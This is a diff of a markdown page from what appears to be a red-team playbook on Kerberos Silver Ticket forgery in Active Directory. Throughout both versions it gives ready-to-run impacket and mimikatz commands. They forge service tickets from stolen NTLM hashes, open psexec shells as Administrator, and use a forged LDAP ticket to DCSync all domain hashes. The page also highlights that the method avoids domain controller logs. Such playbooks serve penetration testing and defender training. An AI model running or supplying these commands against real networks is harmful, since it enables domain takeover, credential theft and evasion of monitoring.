@@ -3,41 +3,52 @@ id: silver-ticket
 title: Silver Ticket
 stage: objective
 tags: [windows, ad, kerberos]
-tools:
-  - impacket-ticketer -spn cifs/$TARGET -domain-sid $SID -nthash $SERVICE_HASH -domain domain.local Administrator
-  - mimikatz "kerberos::golden /domain: /sid: /target: /service:cifs /rc4: /user:Administrator /ptt"
-leads_to: [system-shell, pivot]
-summary: Forge a service ticket (TGS) using a service account's NTLM hash to access a specific service as any user — no DC contact required.
+summary: Forge a TGS for a specific service using the service account's NTLM hash — bypasses the KDC entirely and leaves no DC-side logs.
+leads_to:
+  - system-shell
+  - pivot
 ---
 
-## What is a Silver Ticket
+## Prerequisites
 
-A Silver Ticket is a forged Kerberos TGS (service ticket) signed with the NTLM hash of a service account or computer account. Unlike a Golden Ticket, it doesn't require the KRBTGT hash and bypasses the KDC entirely — communication goes directly from attacker to the target service. It grants access to **one specific service** on **one specific machine**.
+A service account or computer account's NTLM hash (from DCSync, SAM dump, or secretsdump). Domain SID. The SPN of the target service. Unlike Golden Tickets, the DC is never contacted during use — only the target service validates the ticket.
 
-## Gather What You Need
+A Silver Ticket is a forged TGS (service ticket) signed with the NTLM hash of the service account or machine account. It grants access to one specific service on one specific machine. The key advantage over Golden Tickets: no KDC contact during use means no Kerberos logs at the DC. Forge `ldap/$DC` tickets to enable DCSync without DA credentials.
+
+## Quick Win
+
+> Forge a cifs ticket for SMB access to the target machine as Administrator.
+
+```bash
+impacket-ticketer -spn cifs/$TARGET.domain.local \
+  -domain-sid S-1-5-21-... -nthash SERVICE_NTLM_HASH -domain domain.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
+```
+
+## What You Need
+
+> Three values required — SID from secretsdump, hash from dump, SPN determines the access.
 
 ```bash
 # 1. Domain SID
 impacket-getPac -targetUser Administrator domain.local/user:pass -dc-ip $DC
-# or from BloodHound / impacket-lookupsid
+# or: impacket-lookupsid domain.local/user:pass@$DC 0
 
-# 2. Service account NTLM hash (from DCSync, secretsdump, SAM dump, etc.)
-# Target the computer account hash for cifs/http/host tickets
-
-# 3. SPN of the target service
-# cifs/$TARGET      = SMB file access
-# http/$TARGET      = IIS/web
-# host/$TARGET      = generic host management (includes services, schtasks)
-# mssqlsvc/$TARGET  = SQL Server
+# 2. Service account or computer account NTLM hash (from DCSync/secretsdump)
+# 3. SPN — determines what service you access:
+#    cifs/$TARGET      → SMB (C$, ADMIN$)
+#    host/$TARGET      → Services, schtasks, WMI
+#    http/$TARGET      → IIS web
+#    mssqlsvc/$TARGET  → SQL Server
+#    ldap/$DC          → LDAP / DCSync
 ```
 
-## Forge with Impacket
+## Forge with Impacket (Linux)
+
+> Creates `.ccache` — use KRB5CCNAME to authenticate with any impacket tool.
 
 ```bash
-# Get domain SID first
-impacket-getPac domain.local/user:password -targetUser Administrator -dc-ip $DC
-
-# Forge ticket
 impacket-ticketer \
   -spn cifs/$TARGET.domain.local \
   -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
@@ -45,51 +56,40 @@ impacket-ticketer \
   -domain domain.local \
   Administrator
 
-# Use the ticket
 export KRB5CCNAME=Administrator.ccache
 impacket-smbclient -k -no-pass domain.local/Administrator@$TARGET
 impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
 ```
 
-## Forge with Mimikatz
+## Forge with Mimikatz (Windows)
+
+> `kerberos::golden` is used for silver tickets too — `/service:` specifies the ticket type.
 
 ```powershell
-# From a compromised Windows host
 mimikatz.exe
 
-# Dump service account hash first (if not already obtained)
+# Dump service/computer account hash first
 lsadump::dcsync /domain:domain.local /user:TARGET_COMPUTER$
 
-# Forge and inject the ticket
+# Forge and inject
 kerberos::golden \
   /domain:domain.local \
-  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+  /sid:S-1-5-21-... \
   /target:$TARGET.domain.local \
   /service:cifs \
   /rc4:SERVICE_NTLM_HASH \
   /user:Administrator \
   /ptt
 
-# Verify
 klist
 dir \\$TARGET\C$
 ```
 
-## Common Silver Ticket SPNs
+## LDAP Silver Ticket → DCSync Without DA
 
-| SPN | Access Gained |
-|-----|--------------|
-| `cifs/$TARGET` | SMB file shares (C$, ADMIN$) |
-| `host/$TARGET` | Services, schtasks, WMI |
-| `http/$TARGET` | IIS web apps |
-| `mssqlsvc/$TARGET` | SQL Server |
-| `ldap/$DC` | LDAP queries / DCSync |
-| `krbtgt/$DOMAIN` | (Golden Ticket territory) |
-
-## LDAP Silver Ticket → DCSync
+> Forge an LDAP ticket for the DC → enables secretsdump without being in Domain Admins.
 
 ```bash
-# Forge LDAP ticket using DC's NTLM hash → enables DCSync without being DA
 impacket-ticketer \
   -spn ldap/$DC.domain.local \
   -domain-sid $SID \
@@ -101,10 +101,16 @@ export KRB5CCNAME=Administrator.ccache
 impacket-secretsdump -k -no-pass domain.local/Administrator@$DC
 ```
 
-## Notes
+## Common Silver Ticket SPNs
 
-- Silver tickets are **not logged at the DC** (no TGS-REQ) — only the target service sees the request
-- The forged ticket uses RC4 (NTLM hash) by default; AES keys require the AES hash from the DC
-- Computer account hashes change every 30 days by default — use the current hash
-- PAC validation can detect forgery if the service validates with the DC; many services don't
+| SPN | Access |
+|-----|--------|
+| `cifs/$TARGET` | SMB file shares (C$, ADMIN$) |
+| `host/$TARGET` | Services, schtasks, WMI |
+| `http/$TARGET` | IIS web apps |
+| `mssqlsvc/$TARGET` | SQL Server |
+| `ldap/$DC` | LDAP queries and DCSync |
 
+## Leads To
+
+cifs silver ticket → SMB shell on target → system-shell. ldap silver ticket → DCSync for domain hashes without DA membership. host silver ticket → schtasks/service manipulation on target. Computer account hash changes every 30 days — use the current hash from a fresh DCSync.
